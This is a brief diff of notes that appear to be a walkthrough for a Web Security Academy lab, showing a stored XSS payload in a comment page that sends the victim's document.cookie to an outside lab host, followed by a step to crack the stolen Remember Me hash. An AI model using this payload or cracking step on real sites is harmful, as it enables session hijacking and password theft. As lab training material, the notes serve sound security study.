@@ -1,0 +1,10 @@
+# Confirm the Remember Me cookie is stealable 
+
+# Confirm on the XSS vulnerability in comment page
+
+# Construct XSS payload to steal cookie
+<script>
+	fetch.('https://ac781ff01eac4d13805fc37d01fd004e.web-security-academy.net/?cookie='.concat(document.cookie))
+</script>
+
+# Decode the stolen cookie and submit hash to crackstation.net
